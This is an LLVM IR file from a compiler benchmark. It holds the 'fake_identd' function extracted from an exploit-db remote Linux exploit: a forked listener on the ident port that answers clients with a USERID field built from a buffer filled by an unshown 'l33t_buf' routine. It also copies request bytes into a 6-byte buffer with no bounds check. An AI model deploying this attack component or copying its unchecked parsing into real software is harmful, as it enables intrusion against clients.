; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20908.c_fake_identd.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20908.c_fake_identd.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [39 x i8] c"  fake_identd forking into background\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@IDENTD_PORT = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"bind()\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"listen()\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"accept()\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"%d,%d:USERID:%s\0D\0A\00", align 1
@zbuf = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @fake_identd() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = alloca [1024 x i8], align 16
  %9 = alloca [6 x i8], align 1
  %10 = alloca i8*, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (...) @fork()
  %15 = icmp ne i32 %14, 0
  br i1 %15, label %125, label %16

16:                                               ; preds = %0
  %17 = load i32, i32* @AF_INET, align 4
  %18 = load i32, i32* @SOCK_STREAM, align 4
  %19 = call i32 @socket(i32 %17, i32 %18, i32 0)
  store i32 %19, i32* %1, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %24

21:                                               ; preds = %16
  %22 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %23 = call i32 @exit(i32 1) #3
  unreachable

24:                                               ; preds = %16
  %25 = load i32, i32* @AF_INET, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  store i32 %25, i32* %26, align 4
  %27 = load i32, i32* @IDENTD_PORT, align 4
  %28 = call i32 @htons(i32 %27)
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %28, i32* %29, align 4
  %30 = load i32, i32* @INADDR_ANY, align 4
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %32 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %31, i32 0, i32 0
  store i32 %30, i32* %32, align 4
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %34 = call i32 @bzero(i32* %33, i32 8)
  %35 = load i32, i32* %1, align 4
  %36 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %37 = call i32 @bind(i32 %35, %struct.sockaddr* %36, i32 4)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

39:                                               ; preds = %24
  %40 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %41 = call i32 @exit(i32 1) #3
  unreachable

42:                                               ; preds = %24
  %43 = load i32, i32* %1, align 4
  %44 = call i32 @listen(i32 %43, i32 1)
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %46, label %49

46:                                               ; preds = %42
  %47 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %48 = call i32 @exit(i32 1) #3
  unreachable

49:                                               ; preds = %42
  br label %50

50:                                               ; preds = %49, %55, %104
  store i32 16, i32* %3, align 4
  %51 = load i32, i32* %1, align 4
  %52 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %53 = call i32 @accept(i32 %51, %struct.sockaddr* %52, i32* %3)
  store i32 %53, i32* %2, align 4
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %57

55:                                               ; preds = %50
  %56 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  br label %50

57:                                               ; preds = %50
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %59 = call i32 @memset(i8* %58, i32 0, i32 1024)
  %60 = load i32, i32* %2, align 4
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %62 = call i32 @recv(i32 %60, i8* %61, i32 1024, i32 0)
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  store i8* %63, i8** %10, align 8
  store i32 0, i32* %6, align 4
  br label %64

64:                                               ; preds = %69, %57
  %65 = load i8*, i8** %10, align 8
  %66 = load i8, i8* %65, align 1
  %67 = sext i8 %66 to i32
  %68 = icmp ne i32 %67, 44
  br i1 %68, label %69, label %80

69:                                               ; preds = %64
  %70 = load i8*, i8** %10, align 8
  %71 = load i8, i8* %70, align 1
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [6 x i8], [6 x i8]* %9, i64 0, i64 %73
  store i8 %71, i8* %74, align 1
  %75 = load i8*, i8** %10, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %10, align 8
  %77 = load i8, i8* %75, align 1
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %6, align 4
  br label %64

80:                                               ; preds = %64
  %81 = getelementptr inbounds [6 x i8], [6 x i8]* %9, i64 0, i64 0
  %82 = call i32 @sscanf(i8* %81, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32* %4)
  %83 = getelementptr inbounds [6 x i8], [6 x i8]* %9, i64 0, i64 0
  %84 = call i32 @memset(i8* %83, i32 0, i32 6)
  %85 = load i8*, i8** %10, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %10, align 8
  %87 = load i8, i8* %85, align 1
  store i32 0, i32* %6, align 4
  br label %88

88:                                               ; preds = %93, %80
  %89 = load i8*, i8** %10, align 8
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = icmp ne i32 %91, 32
  br i1 %92, label %93, label %104

93:                                               ; preds = %88
  %94 = load i8*, i8** %10, align 8
  %95 = load i8, i8* %94, align 1
  %96 = load i32, i32* %6, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [6 x i8], [6 x i8]* %9, i64 0, i64 %97
  store i8 %95, i8* %98, align 1
  %99 = load i8*, i8** %10, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %10, align 8
  %101 = load i8, i8* %99, align 1
  %102 = load i32, i32* %6, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %6, align 4
  br label %88

104:                                              ; preds = %88
  %105 = getelementptr inbounds [6 x i8], [6 x i8]* %9, i64 0, i64 0
  %106 = call i32 @sscanf(i8* %105, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32* %5)
  %107 = call i32 (...) @l33t_buf()
  %108 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %109 = call i32 @memset(i8* %108, i32 0, i32 1024)
  %110 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %111 = load i32, i32* %4, align 4
  %112 = load i32, i32* %5, align 4
  %113 = load i8*, i8** @zbuf, align 8
  %114 = call i32 @sprintf(i8* %110, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0), i32 %111, i32 %112, i8* %113)
  %115 = load i32, i32* %2, align 4
  %116 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %117 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %118 = call i32 @strlen(i8* %117)
  %119 = call i32 @send(i32 %115, i8* %116, i32 %118, i32 0)
  %120 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %121 = call i32 @memset(i8* %120, i32 0, i32 1024)
  %122 = load i32, i32* %2, align 4
  %123 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %124 = call i32 @recv(i32 %122, i8* %123, i32 1024, i32 0)
  br label %50

125:                                              ; preds = %0
  ret void
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*) #1

declare dso_local i32 @l33t_buf(...) #1

declare dso_local i32 @sprintf(i8*, i8*, i32, i32, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
